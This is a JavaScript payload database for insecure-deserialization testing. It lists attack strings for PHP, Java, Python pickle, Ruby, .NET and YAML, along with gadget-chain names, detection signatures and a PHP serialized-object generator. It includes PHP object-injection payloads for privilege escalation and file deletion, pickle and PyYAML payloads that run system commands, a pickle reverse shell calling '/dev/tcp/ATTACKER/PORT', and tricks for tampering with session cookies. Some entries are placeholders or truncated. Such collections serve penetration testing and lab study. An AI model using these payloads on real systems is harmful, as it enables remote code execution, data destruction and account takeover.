// Insecure Deserialization Payloads
// Comprehensive payload database for deserialization vulnerability testing

const DeserializationPayloads = {
    // PHP Object Injection
    php: {
        name: 'PHP',
        signatures: ['O:', 'a:', 's:', 'i:', 'b:'],
        payloads: [
            {
                name: 'Basic Object Injection',
                payload: 'O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}',
                description: 'Modify object properties'
            },
            {
                name: 'Privilege Escalation',
                payload: 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"administrator_access_token_here";}',
                description: 'Escalate to admin'
            },
            {
                name: 'Magic Method Exploit',
                payload: 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}',
                description: 'Exploit __destruct or __wakeup'
            },
            {
                name: 'File Delete via __destruct',
                payload: 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}',
                description: 'Delete arbitrary files'
            }
        ],
        gadgets: [
            'Monolog/RCE1',
            'Monolog/RCE2',
            'Guzzle/RCE1',
            'Laravel/RCE1',
            'Symfony/RCE1'
        ]
    },

    // Java Deserialization
    java: {
        name: 'Java',
        signatures: ['rO0', 'aced0005', 'H4sIAAAA'],
        payloads: [
            {
                name: 'Apache Commons Collections',
                payload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...',
                description: 'CommonsCollections gadget chain'
            },
            {
                name: 'Spring Framework',
                payload: 'Base64EncodedSpringPayload',
                description: 'Spring gadget chain'
            }
        ],
        gadgets: [
            'CommonsCollections1',
            'CommonsCollections2',
            'CommonsCollections3',
            'CommonsCollections4',
            'CommonsCollections5',
            'CommonsCollections6',
            'CommonsCollections7',
            'Spring1',
            'Spring2',
            'Hibernate1',
            'JBossInterceptors1',
            'JavassistWeld1'
        ]
    },

    // Python Pickle
    python: {
        name: 'Python',
        signatures: ['gASV', '\\x80\\x03', '\\x80\\x04'],
        payloads: [
            {
                name: 'OS Command Execution',
                payload: "cos\\nsystem\\n(S'id'\\ntR.",
                description: 'Execute system commands'
            },
            {
                name: 'Reverse Shell',
                payload: "cos\\nsystem\\n(S'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'\\ntR.",
                description: 'Spawn reverse shell'
            }
        ]
    },

    // Ruby Marshal
    ruby: {
        name: 'Ruby',
        signatures: ['BAh', '\\x04\\x08'],
        payloads: [
            {
                name: 'ERB Template Injection',
                payload: 'Universal Deserialisation Gadget for Ruby',
                description: 'Execute Ruby code'
            }
        ]
    },

    // .NET
    dotnet: {
        name: '.NET',
        signatures: ['AAEAAAD', 'TVqQAAM'],
        payloads: [
            {
                name: 'TypeConfuseDelegate',
                payload: 'YSoGate Payload',
                description: '.NET TypeConfuseDelegate'
            },
            {
                name: 'ObjectDataProvider',
                payload: 'ObjectDataProvider gadget',
                description: 'Execute commands via ObjectDataProvider'
            }
        ],
        gadgets: [
            'TypeConfuseDelegate',
            'ObjectDataProvider',
            'WindowsIdentity',
            'ClaimsPrincipal'
        ]
    },

    // YAML Deserialization
    yaml: {
        name: 'YAML',
        signatures: ['!!python', '!ruby'],
        payloads: [
            {
                name: 'Python YAML RCE',
                payload: "!!python/object/apply:os.system ['id']",
                description: 'Execute commands via PyYAML'
            },
            {
                name: 'Ruby YAML RCE',
                payload: "!ruby/object:Gem::Installer\\ni: x",
                description: 'Execute commands via Ruby YAML'
            }
        ]
    },

    // Session cookie manipulation
    sessionManipulation: [
        { technique: 'Modify admin flag', payload: 'admin=true in serialized cookie' },
        { technique: 'Change user role', payload: 'role=administrator' },
        { technique: 'Modify access level', payload: 'access_level=9999' }
    ]
};

// Detection signatures
const DetectionSignatures = {
    php: {
        regex: /^[Oa]:\d+:/,
        base64Regex: /^[A-Za-z0-9+/]+=*$/
    },
    java: {
        magic: 'rO0',
        hexMagic: 'aced0005'
    },
    python: {
        magic: ['gASV', '\\x80\\x03', '\\x80\\x04\\x95']
    }
};

// Helper functions
function getPhpPayloads() {
    return DeserializationPayloads.php.payloads;
}

function getJavaPayloads() {
    return DeserializationPayloads.java.payloads;
}

function getPythonPayloads() {
    return DeserializationPayloads.python.payloads;
}

function detectSerializationType(data) {
    if (data.startsWith('O:') || data.startsWith('a:') || data.startsWith('s:')) {
        return 'PHP';
    }
    if (data.startsWith('rO0') || data.includes('aced0005')) {
        return 'Java';
    }
    if (data.startsWith('gASV') || data.includes('\\x80\\x03')) {
        return 'Python Pickle';
    }
    if (data.startsWith('BAh')) {
        return 'Ruby Marshal';
    }
    if (data.includes('AAEAAAD')) {
        return '.NET';
    }
    return 'Unknown';
}

function getPayloadCount() {
    return DeserializationPayloads.php.payloads.length +
        DeserializationPayloads.java.payloads.length +
        DeserializationPayloads.python.payloads.length +
        DeserializationPayloads.ruby.payloads.length +
        DeserializationPayloads.dotnet.payloads.length +
        DeserializationPayloads.yaml.payloads.length +
        DeserializationPayloads.sessionManipulation.length;
}

function generatePhpPayload(className, properties) {
    let serialized = `O:${className.length}:"${className}":${Object.keys(properties).length}:{`;
    for (const [key, value] of Object.entries(properties)) {
        serialized += `s:${key.length}:"${key}";`;
        if (typeof value === 'string') {
            serialized += `s:${value.length}:"${value}";`;
        } else if (typeof value === 'boolean') {
            serialized += `b:${value ? 1 : 0};`;
        } else if (typeof value === 'number') {
            serialized += `i:${value};`;
        }
    }
    serialized += '}';
    return serialized;
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        DeserializationPayloads,
        DetectionSignatures,
        getPhpPayloads,
        getJavaPayloads,
        getPythonPayloads,
        detectSerializationType,
        getPayloadCount,
        generatePhpPayload
    };
}
